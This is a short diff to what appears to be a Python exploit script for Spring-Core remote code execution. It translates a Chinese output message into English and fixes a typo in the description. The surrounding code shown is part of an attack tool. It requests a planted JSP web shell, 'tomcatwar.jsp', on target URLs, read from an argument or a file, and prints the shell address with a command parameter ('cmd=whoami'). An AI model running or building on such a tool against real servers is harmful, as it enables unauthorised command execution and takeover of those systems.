@@ -19,7 +19,7 @@ def Exploit(url):
         shellurl = urljoin(url, 'tomcatwar.jsp')
         shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
         if shellgo.status_code == 200:
-            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
+            print(f"The vulnerability exists, shell address is:{shellurl}?pwd=j&cmd=whoami")
     except Exception as e:
         print(e)
         pass
@@ -28,7 +28,7 @@ def Exploit(url):
 
 
 def main():
-    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
+    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
     parser.add_argument('--file',help='url file',required=False)
     parser.add_argument('--url',help='target url',required=False)
     args = parser.parse_args()
